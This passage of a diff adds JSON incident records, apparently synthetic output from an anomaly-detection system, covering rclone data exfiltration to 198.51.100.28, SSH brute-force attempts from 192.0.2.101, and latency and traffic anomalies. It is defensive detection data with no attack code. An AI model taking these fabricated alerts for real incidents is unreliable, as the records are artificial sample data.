+        "evidence":"ESTABLISHED 10.0.1.15:54445 -> 198.51.100.28:21 proto=tcp bytes_out=1153000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:35:55.783428+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1133 MB sent to external 198.51.100.28:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:54086 -> 198.51.100.28:8443 proto=tcp bytes_out=1133000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:36:10.039633+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1658 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:41440 -> 198.51.100.28:21 proto=tcp bytes_out=1658000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:36:52.254483+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1625 MB sent to external 198.51.100.28:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:52170 -> 198.51.100.28:4444 proto=tcp bytes_out=1625000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      }
+    ]
+  },
+  {
+    "key":"web-01:latency_degradation:20260116T1531",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-16T15:31:00+00:00",
+    "end":"2026-01-16T15:36:00+00:00",
+    "peak_score":1.7556,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":4.77
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":2.07
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.93
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":1.53
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260116T1532",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-16T15:32:00+00:00",
+    "end":"2026-01-16T15:35:00+00:00",
+    "peak_score":1.3075,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":2.29
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.87
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":1.42
+      },
+      {
+        "metric":"process_count",
+        "z":1.12
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:latency_degradation:20260116T1533",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T15:33:00+00:00",
+    "end":"2026-01-16T15:35:00+00:00",
+    "peak_score":1.0328,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":2.94
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":1.75
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.47
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":1.25
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:traffic_surge:20260116T1628",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T16:28:00+00:00",
+    "end":"2026-01-16T17:26:00+00:00",
+    "peak_score":10.6351,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"traffic_surge",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":33.92
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":31.39
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":27.85
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":8.34
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:error_burst:20260116T1937",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-16T19:37:00+00:00",
+    "end":"2026-01-16T20:03:00+00:00",
+    "peak_score":6.0738,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"error_burst",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"error_rate_pct",
+        "z":44.12
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":3.56
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.83
+      },
+      {
+        "metric":"process_count",
+        "z":-0.77
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:ssh_brute_force:20260116T2304",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-16T23:04:00+00:00",
+    "end":"2026-01-16T23:17:00+00:00",
+    "peak_score":6.664,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"ssh_brute_force",
+    "category":"security",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":38.46
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":-1.74
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.47
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.15
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:08.661950+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"15 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 192.0.2.101 port 51246 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:09.032128+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"16 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for root from 192.0.2.101 port 55370 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:10.313592+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"17 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user root from 192.0.2.101 port 64021 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:10.565578+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"18 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 192.0.2.101 port 58581 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:10.992113+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"19 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for root from 192.0.2.101 port 52497 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:11.201692+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"20 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 192.0.2.101 port 41671 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:11.351350+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"21 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user test from 192.0.2.101 port 41021 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:11.643858+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"22 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user test from 192.0.2.101 port 39541 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:13.333303+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"23 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user git from 192.0.2.101 port 32299 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:13.369654+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"24 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user root from 192.0.2.101 port 57897 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:13.736423+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"25 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user pi from 192.0.2.101 port 36111 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:14.305730+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"26 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for root from 192.0.2.101 port 48430 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:14.936302+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"27 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user test from 192.0.2.101 port 47330 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:15.092778+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"28 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for root from 192.0.2.101 port 64934 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:15.103669+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"29 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user git from 192.0.2.101 port 64037 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:15.128063+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"30 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user deploy from 192.0.2.101 port 51510 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:16.212541+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"31 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user root from 192.0.2.101 port 34161 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:16.240227+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"32 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user admin from 192.0.2.101 port 62443 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:16.687784+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"33 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for invalid user git from 192.0.2.101 port 44429 ssh2",
+        "source_ip":"192.0.2.101"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T23:04:16.796185+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"34 failed SSH logins from 192.0.2.101 in 5 min",
+        "evidence":"Failed password for root from 192.0.2.101 port 63562 ssh2",
+        "source_ip":"192.0.2.101"
+      }
+    ]
+  }
+]
